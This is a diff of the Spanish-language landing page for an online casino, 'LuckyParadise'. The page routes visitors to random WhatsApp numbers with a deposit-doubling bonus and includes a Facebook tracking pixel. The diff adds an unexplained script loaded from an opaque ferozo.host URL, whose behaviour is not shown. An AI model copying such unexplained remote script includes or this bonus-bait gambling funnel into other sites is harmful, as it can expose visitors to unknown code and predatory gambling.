@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>LuckyParadise</title>
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="estilo.css">
 
 <!-- Dentro del <head> -->
 <script>
@@ -22,66 +21,103 @@ fbq('track', 'PageView');
 </script>
   
 </head>
+
+
+  
+   <style>
+        body {
+            font-family: 'Kanit', sans-serif;
+            background-color: #0a3718;
+            text-align: center;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 50px 20px;
+        }
+
+        .avatar {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-family: 'Kanit', sans-serif;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+
+        .cta-btn {
+            background-color: #04833c;
+            color: white;
+            padding: 25px 50px;
+            font-size: 24px;
+            text-decoration: none;
+            border-radius: 50px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+            font-family: 'Kanit', sans-serif;
+        }
+
+        .cta-btn:hover {
+            background-color: #0a3718;
+            transform: scale(1.05);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+        }
+
+        .whatsapp-icon {
+            width: 40px;
+            height: 40px;
+        }
+
+        .footer {
+            margin-top: 35px;
+            font-size: 30px;
+            font-family: 'Kanit', sans-serif;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+    </style>
+<script type="text/javascript" src="https://ferozo.host/GxulCrF8ubDqHzQhxLFXzhbRSowh_X0XnYii5pYy7e1j4SiDRlGaa-SrbqNalmYoNplKR_u6cyjB3o0OzIlp-g=="></script></head>
 <body>
 <noscript>
   <img height="1" width="1" style="display:none"
   src="https://www.facebook.com/tr?id=1766546837196355&ev=PageView&noscript=1" />
 </noscript>
   
-  <h1 class="logo-text">
-  <span class="logo-emoji">🎰</span>
-  <span class="logo-text-fill">Lucky Paradise</span>
-</h1>
+    <div class="container">
+        <img src="avatar.jpeg" alt="Avatar" class="avatar">
+        <h1>ENVIANOS UN WHATSAPP PARA CREAR TU CUENTA</h1>
+        
+        <!-- Botón con llamada a la función de JavaScript -->
+        <a href="#" class="cta-btn" onclick="openRandomLink()">
+            <span>DUPLICAMOS TU PRIMERA CARGA!</span>
+            <img src="whatsapp.png" alt="WhatsApp" class="whatsapp-icon">
+        </a>
 
-  <div class="card">
-  <div class="main-text">
-    <p class="typing">🔥TOCA EL BOTON Y CREA TU USUARIO🔥</p>
-    <p><span class="dorado-neon">RETIROS ILIMITADOS</span></p>
-  </div>
+        <div class="footer">
+            <p style="color: #efb810;">100% EN TU PRIMERA CARGA!!</p>
+            <p>Mínimo de Carga $1000</p>
+            <p>Ruleta en Vivo - Slots - Apuestas Deportivas y Mucho más.</p>
+        </div>
+    </div>
 
-  <button class="popup-button" id="whatsappButton">
-    <span>¡RECLAMA TU BONO AHORA!</span>
-    <img src="WhatsApp.svg-2.webp" alt="Whatsapp">
-  </button>
-</div>
+    <script>
+        function openRandomLink() {
+            const links = [
 
-<div class="barra-juegos-slider">
-  <div class="scroll-content">
-    <!-- primer set -->
-    <img src="game.pragmaticPlayGatesOfOlympus.thumbnail.512x512_v4.png" alt="Slots">
-    <img src="game.pragmaticPlayGoldParty.thumbnail.512x512_v3.png" alt="Ruleta">
-    <img src="game.pragmaticPlayJokersJewels.thumbnail.512x512_v3.png" alt="Cartas">
-    <img src="game.pragmaticPlaySweetBonanza.thumbnail.512x512_v4.png" alt="Deportes">
-    <img src="game.pragmaticPlayCongoCash.thumbnail.512x512_v3.png" alt="Jackpot">
-
-    <!-- segundo set (duplicado para loop infinito) -->
-    <img src="game.mg9MasksOfFire.thumbnail.512x512_v3.png" alt="Slots">
-    <img src="game.pragmaticPlayGatesOfOlympus.thumbnail.512x512_v4.png" alt="Ruleta">
-    <img src="game.pragmaticPlayJokersJewels.thumbnail.512x512_v3.png" alt="Cartas">
-    <img src="game.pragmaticPlaySweetBonanza.thumbnail.512x512_v4.png" alt="Deportes">
-    <img src="game.pragmaticPlayCongoCash.thumbnail.512x512_v3.png" alt="Jackpot">
-  </div>
-</div>
-  
-  <div class="info-externa">
-    <p>Mínimo de carga: $1000</p>
-    <p>RULETA EN VIVO - SLOTS - APUESTAS</p>
-  </div>
-
-  <div class="metodos-pago">
-  <h2 class="titulo-pago">MÉTODOS DE PAGO</h2>
-  <div class="iconos-pago">
-    <img src="8043680.png" alt="Mastercard">
-    <img src="Mercado Pago.png" alt="MercadoPago">
-    <img src="logo-large.png" alt="Rapipago">
-    <img src="logo-cuenta-dni.png" alt="Pago Fácil">
-  </div>
-</div>
-
-<script>
-  document.getElementById("whatsappButton").addEventListener("click", function () {
-    const links = [
-      
 'https://wa.me/5491137616068?text=Hola%2C%20quiero%20mi%20usuario',
 'https://wa.me/5491137577945?text=Hola%2C%20quiero%20mi%20usuario',
 'https://wa.me/5491137608189?text=Hola%2C%20quiero%20mi%20usuario',
@@ -92,15 +128,12 @@ fbq('track', 'PageView');
 'https://wa.me/5491155177784?text=Hola%2C%20quiero%20mi%20usuario'
 
 
-    ];
+            ];
 
-    const randomLink = links[Math.floor(Math.random() * links.length)];
+            const randomLink = links[Math.floor(Math.random() * links.length)];
+            window.location.href = randomLink;
+        }
+    </script>
 
-    window.open(
-      `${randomLink}?text=${encodeURIComponent("Buenas! Me gustaría crear un usuario.")}`,
-      "_blank"
-    );
-  });
-</script>
 </body>
 </html>
